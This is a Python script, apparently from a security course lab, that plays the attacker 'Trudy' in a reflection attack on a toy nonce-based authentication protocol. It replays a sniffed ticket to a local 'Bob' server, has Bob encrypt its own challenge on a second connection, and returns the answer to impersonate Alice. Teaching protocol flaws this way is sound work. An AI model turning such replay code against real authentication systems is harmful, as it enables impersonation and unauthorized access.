#
# Create the Trudy client that is used to perform a reflection attack
#

import socket
from Crypto.Cipher import DES3
import base64

# Declare the ports for communication
HOST = 'localhost'
PORT_BOB = 5001

# Values in bytes
LENGTH_OF_NONCES = 8
MESSAGE_SIZE = 1024

# Sniffed message 3 and 4
sniffed_message_3 = b'A0Vtr8ktNd+zBv4kh8myNwmll4mz7UjoZ7SvlCTxy+Gh7M/oy5VQ1GWJlznyF7zO\n\xdcP\xcd\xb5\xb1|O\xc0'
sniffed_message_4 = b'@\xbe\xff\xbe\xe6@53|s9\xa3\x05\x13\xd1\x8c'

def main():

    # Connect with bob and replay the 3rd message that was eavesdropped in on
    s_bob = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_bob.connect((HOST, PORT_BOB))
    
    # Replay message
    s_bob.sendall(sniffed_message_3)

    # Bob responds with Kab {N2 - 1, N4}
    recv = s_bob.recv(MESSAGE_SIZE)
    print('Received from Bob:', recv)

    # Grab the last 64-bits to grab N4 (message will be total of 16-bytes)
    n4 = recv[8:]
    print('N4:', n4)

    # Open a new connection with Bob...
    s_bob_2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_bob_2.connect((HOST, PORT_BOB))
    
    # Now send to Bob a new packet where the eavesdropped message will have Kab{N4} spliced onto the end instead of 
    length_of_packet = len(sniffed_message_3)
    ticket_of_packet = sniffed_message_3[0:length_of_packet-LENGTH_OF_NONCES]
    new_packet = b''.join([ticket_of_packet, n4])
    print('New crafted packet with N4 sent:', new_packet)
    s_bob_2.sendall(new_packet)

    # Get back from this packet Kab {N4 - 1, N5}
    recv = s_bob_2.recv(MESSAGE_SIZE)

    # Take out Kab {N4 - 1} and close this connection
    n4_dec = recv[0:8]

    # In the first socket, send back this value! Correctly authenticated as Alice now...
    s_bob.sendall(n4_dec) 

if __name__ == "__main__":
    main()